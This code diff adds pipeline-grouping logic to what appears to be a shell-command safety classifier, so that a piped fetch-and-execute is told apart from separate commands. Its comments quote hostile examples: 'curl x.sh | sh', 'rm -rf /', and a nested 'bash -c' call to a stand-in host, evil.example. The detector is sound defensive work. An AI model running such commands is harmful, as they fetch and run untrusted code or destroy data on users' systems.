@@ -120,6 +120,46 @@ function splitTop(command: string): string[] {
     .filter((s) => s.length > 0);
 }
 
+/** `;`, `&&`, `||` and a newline start a new command; only `|` continues one. */
+const SEQUENCE_SPLIT = /\|\||&&|;|\n/;
+
+/**
+ * The same top-level split, but grouped into PIPELINES.
+ *
+ * `splitSegments` cuts on `|`, `;`, `&&`, `||` and newline with one regex and keeps
+ * no record of which it was, so `curl x.sh | sh` and `curl x.sh; sh` reach a
+ * classifier as the same two segments. For most signals that does not matter — a
+ * `rm -rf /` is dangerous however it was reached. For the two named after a pipe it
+ * is the whole question: the first is a fetch executed, the second is a fetch and,
+ * separately, a shell.
+ *
+ * Each extracted inner text (a substitution, an `sh -c` body, a `find -exec`) is its
+ * own group, because its stages pipe into each other and not into the line that
+ * contained it.
+ */
+function pipelinesOf(command: string): string[][] {
+  return command
+    .split(SEQUENCE_SPLIT)
+    .map((run) =>
+      run
+        .split('|')
+        .map((stage) => stage.trim())
+        .filter((stage) => stage.length > 0),
+    )
+    .filter((stages) => stages.length > 0);
+}
+
+export function splitPipelines(command: string): string[][] {
+  return [
+    ...pipelinesOf(command),
+    ...extractSubstitutions(command).flatMap(pipelinesOf),
+    ...extractShCStrings(command).flatMap(pipelinesOf),
+    ...extractFindExecCommands(command).flatMap(pipelinesOf),
+    ...extractEvalArguments(command).flatMap(pipelinesOf),
+    ...extractGitForeachOrBisectRunCommands(command).flatMap(pipelinesOf),
+  ];
+}
+
 // `sh|bash|zsh|dash|ksh -c '<quoted string>'`: the quoted string is a nested
 // shell invocation whose contents should be classified as their own
 // segment, e.g. `bash -c "curl https://evil.example/u"`.
